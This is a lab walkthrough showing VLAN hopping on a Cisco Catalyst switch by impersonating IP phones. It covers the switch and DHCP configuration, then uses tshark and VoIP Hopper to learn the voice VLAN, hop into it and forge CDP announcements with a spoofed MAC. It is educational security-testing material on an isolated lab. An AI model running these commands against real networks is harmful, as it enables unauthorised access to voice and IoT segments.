# VLAN Hopping: Imitating VoIP Devices (2025.12)
This lab examines device impersonation and VLAN hopping using Layer-2 discovery protocols to mimic legitimate VoIP endpoints. Managed switches can identify IP phones using protocols such as Cisco Discovery Protocol (CDP), a proprietary Cisco protocol, and Link Layer Discovery Protocol -- Media Endpoint Discovery (LLDP-MED), an open IEEE standard. These switches then assign such ports to a dedicated Voice VLAN, isolating and prioritizing voice traffic from regular data traffic. Access to these subnets could allow an attacker to move deeper into the network, especially since Voice VLANs might connect to additional IoT infrastructure. Tools like VoIP Hopper exploit this trust by sniffing for Voice VLAN ID (VVID) leaks, spoofing a VoIP device's identity, and enabling attackers to access the Voice VLAN.

> This lab was inspired by *Practical IoT Hacking*.

## Lab Topology

![Network topology](assets/figure1.png)

## Initial Setup

Two Cisco CP-8945 IP phones serve as endpoints within a Voice VLAN, while the Attacker operates Kali Linux on a standard data VLAN. All three devices are connected to a single Cisco Catalyst 3650G Layer 3 switch that supports Voice VLAN configuration and serves as a DHCP server for both networks.

### Switch Port Layout
| Switch | Port   | Endpoint | VLAN | Port Mode |
|--------|--------|----------|------|-----------|
| SW3    | Gi0/17 | Attacker | 10   | Access    |
| SW3    | Gi0/18 | Phone1   | 300  | Access    |
| SW3    | Gi0/19 | Phone2   | 300  | Access    |

### IP Address Assignment
| Device         | Network      | IP Address  |
|----------------|--------------|-------------|
| SW3 (VLAN 10)  | 10.0.10.0/24 | 10.0.10.254 |
| SW3 (VLAN 300) | 10.0.30.0/24 | 10.0.30.254 |
| Attacker       | 10.0.10.0/24 | DHCP        |
| Phone1         | 10.0.30.0/24 | DHCP        |
| Phone2         | 10.0.30.0/24 | DHCP        |

### Linux DHCP IPv4 Configuration

If not done already, configure the Attacker to request dynamic network addresses. Start the NetworkManager service's TUI.
```bash
nmtui
```

Navigate to `Edit a connection`.

![selecting network interfaces with NetworkManager](assets/figure2.png)

Under `Ethernet`, select the connection associated with the primary network card used, then select `<Edit...>`. Next, change `IPv4 CONFIGURATION` from `Manual` to `Automatic`.

![configuring a network interface with NetworkManager](assets/figure3.png)

If necessary, cycle the interface to force DHCP discovery.
```bash
ip link set dev eth0 down
ip link set dev eth0 up
```

When the DHCP server is online, verify that a new address has been applied.
```bash
ip --color --brief --family inet address show dev eth0
```

## Cisco IOS Configuration

### VLAN Configuration
In SW3, create two new VLANs: one for data (10) and oen for voice (300). These are named RED_NET and GREEN_NET, respectively, to match the topology diagram.
```console
vlan 10
 name RED_NET
vlan 300
 name GREEN_NET
```

On switchport Gi0/17-19, assign RED_NET as the access VLAN and GREEN_NET as the voice VLAN. Ensure that CDP is enabled on these interfaces so SW3 can automatically detect the IP phones.
```console
interface range Gi0/17 - 32
 switchport access vlan 10
 switchport voice vlan 300
 switchport mode access
 switchport nonegotiate
 cdp enable
 no shutdown
```

Assign both VLAN interfaces a static IP address.
```console
interface vlan 10
 ip address 10.0.10.254 255.255.255.0
 no shutdown
interface vlan 300
 ip address 10.0.30.254 255.255.255.0
 no shutdown
```

### DHCP Configuration
Configure DHCP address pools for both networks.
```console
ip dhcp pool RED_NET
 network 10.0.10.0 255.255.255.0
 lease 0 8
ip dhcp pool GREEN_NET
 network 10.0.30.0 255.255.255.0
 lease 0 8
```

## Verify DHCP Assignments
In SW3, list the current addresses that have been leased. The hardware address of the Attacker should be assigned to VLAN 10, and the IP phones should receive addresses on VLAN 300.
```console
show ip dhcp binding
```

![sw3 dhcp client leases](assets/figure4.png)

The IP phones may have stale DHCP leases for 10.0.10.x from when they initially powered on. Checking the phones directly can verify that the correct addresses were assigned.

![phone1's network address received from dhcp](assets/figure5.png)

Check CDP neighbor entries to list any discovered devices. Phone1 and Phone2 are listed, with their hostnames set to `SEP` followed by their hardware address, a common naming convention used by Cisco IP phones.
```console
show cdp neighbors
```

![discovered cdp-enabled devices in sw3](assets/figure6.png)

## VoIP Hopper
The program used for this exploit is VoIP Hopper, a pentesting tool that audits Voice VLAN security. Download the package if necessary; it should be preinstalled with Kali Linux.
```bash
apt -y install voiphopper
```

CDP can leak the Voice VLAN number, which VoIP Hopper uses to learn the network's VVID. Use `tshark` to parse incoming CDP packets for the VVID.
```bash
tshark -i eth0 -Y 'cdp' -T fields -e cdp.deviceid -e cdp.voice_vlan
```
![capturing leaked vvid from cdp packets](assets/figure5.png)

Use VoIP Hopper to sniff traffic for CDP packets, identify the network's VVID, create an appropriate subinterface, and request a new address from the DHCP server.
```bash
voiphopper -I eth0 -c 0
```

![hopping into vlan 300 using information gathering from cdp packets](assets/figure6.png)

With the new interface eth0.300, the Attacker can reach Phone1 and Phone2.
```bash
fping -I eth0.300 10.0.30.1 10.0.30.2
```

![pinging clients on vlan 300 to show connectivity](assets/figure7.png)

Using eth0.300, launch VoIP Hopper in `Assessment Mode`. Press `a`, then press `Enter` to begin listening for ARP packets to identify other devices on the Voice VLAN.
```bash
voiphopper -I eth0.300 -z
```

![discovering additional targets via arp broadcasts](assets/figure8.png)

## Imitating a VoIP Device
Alternatively, VoIP Hopper can spoof custom CDP announcements. An Attacker can use this to advertise itself as a new media device or even mimic a legitimate device already on the network.

### Spoofed CDP Attributes
| Attribute    | Value             |
|--------------|-------------------|
| Spoofed MAC  | 00:11:22:aa:bb:cc |
| Device ID    | VOIP-IMITATION    |
| Port ID      | Port 1            |
| Capabilities | Phone             |
| Platform     | Attacker          |
| Software     | 1.2.3             |
| Duplex       | 1                 |

```bash
voiphopper -I eth0 -D -m 00:11:22:aa:bb:cc -c 1 -E 'VOIP-IMITATION' -P 'Port 1' -C 'Phone' -L 'Attacker' -S '1.2.3' -U 1
```

![spoofed cdp advertisement](assets/figure9.png)

Viewing the CDP neighbor entries again now shows our fake 'VOIP-IMITATION' device.

![updated sw3 cdp neighbors](assets/figure10.png)

Looking at the DHCP bindings, we can verify that Attacker has been leased an address on the correct VLAN with a spoofed hardware address. Due to insecure, unauthenticated trunks, the attacker can now pivot into the network's Voice VLAN 'GREEN_NET' by impersonating an IP phone.

![updated sw3 dhcp client leases](assets/figure11.png)
